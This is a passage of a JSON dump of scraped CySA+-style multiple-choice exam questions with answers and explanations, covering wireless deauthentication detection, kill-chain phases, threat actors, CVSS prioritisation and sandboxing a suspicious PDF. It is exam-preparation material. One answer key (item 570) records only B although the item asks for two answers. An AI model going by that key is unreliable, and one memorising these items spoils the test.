data-choice-letter=\"C\">C.&nbsp;</span>SLO</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>NDA</li></ul></div><!--EndFragment-->","correct":"A","explanation":"The key clues are pre-contract stage and no detailed definitions yet.\n\nAn MOU establishes a general understanding between two organizations about cooperation, responsibilities, and intentions without requiring the detailed commitments of a formal contract."},{"number":567,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Users frequently get disconnected from the company's internal wireless network. The wireless system and clients are healthy. Once disconnected, the wireless clients reconnect automatically. Which of the following is the best way for a security analyst to determine the source of the wireless disconnection?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Looking at authentication logs for impossible travel</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Collecting the RADIUS logs and investigating the IP addresses of failed user authentications</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Utilizing aireplay-ng to disconnect the malicious wireless station and capture its handshake</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Using a client with kismet to analyze the airspace for potential deauthentication attacks</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The key clues are:\n\nUsers are frequently disconnected\nWireless infrastructure and clients are healthy\nClients automatically reconnect\nThis strongly suggests a possible wireless deauthentication attack.\n\nKismet can passively monitor the wireless environment and help identify suspicious deauthentication/disassociation activity."},{"number":568,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">While reviewing logs, a SOC analyst notices traffic that is attempting connections to all hosts on ports 1-65535. Which of the following steps of the Cyber Kill Chain is most likely occurring?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Delivery</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Installation</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Reconnaissance</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Weaponization</li></ul></div><!--EndFragment-->","correct":"C","explanation":"Attempting connections to all hosts across ports 1–65535 is characteristic of network/port scanning, which is part of the Reconnaissance phase."},{"number":569,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst responds to an incident and finds the attacker embedded in the critical infrastructure. There is no evidence of lateral movement in the past 30 days. Which of the following is the most likely type of threat actor in the system?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Script kiddie</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Organized crime</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Hacktivist</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Nation-state</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The key clues are:\n\nEmbedded in critical infrastructure\nNo lateral movement for 30 days\nIndicates a long-term, stealthy presence\n\nThis behavior is characteristic of a nation-state/APT, which may maintain persistence and remain dormant for extended periods for intelligence gathering or future operations."},{"number":570,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst reviews the following report:<br><br><img src=\"https://img.examtopics.com/cs0-003/image137.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following explain the reason the analyst gives 1.15 the highest priority for remediation? (Choose two.)</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Highly privileged user accounts can be used to gain access to the system.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>It requires the lowest level of permissions to execute.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>The attacker can use elevated privileges to execute arbitrary code.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>The vulnerable software can be accessed from remote networks.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>The system must be accessed with an interactive session for exploitation.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"F\">F.&nbsp;</span>It requires user interaction to exploit the vulnerability.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\">Answer: B and D</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\">Choose B</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The key is the CVSS 4.0 vectors.\n\nFor 1.15:\n\nAV:N / AC:L / AT:P / PR:N / UI:N / VC:H / VI:H\n\nB. It requires the lowest level of permissions to execute. ✅\nPR:N = No privileges required.\nD. The vulnerable software can be accessed from remote networks. ✅\nAV:N = Network accessible."},{"number":571,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Given the following report:<br><br><img src=\"https://img.examtopics.com/cs0-003/image138.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following vulnerabilities should be prioritized for immediate remediation?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>SQL injection in the financial processing module</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Remote code execution via file upload</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Privilege escalation in OS kernel</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Information disclosure</li></ul></div><!--EndFragment-->","correct":"A","explanation":"A. SQL injection in the financial processing module\n\nIt has the highest CVSS score: 8.7, and the exploit is:\n\nNetwork accessible\nNo privileges required\nNo user interaction required\nCritical asset\nExploit available\n\nThat combination makes it the highest immediate risk."},{"number":572,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An employee submits a ticket that contains the following information to a cybersecurity analyst:<br><br>Ticket Body: Please review this file received via email as it is coming from an unknown sender and let me know if it is safe to open.<br>Ticket Attachment: Invoice-0123456789.pdf<br><br>Which of the following is the best way to help the analyst determine the impact of opening the attachment if the file has been customized for the specific recipient?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Execute cuckoo submit Invoice-0123456789.pdf.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Run strings Invoice-0123456789.pdf.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Submit the sender IP address to AbuselPDB and review the report.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Send the IP address found on the emai
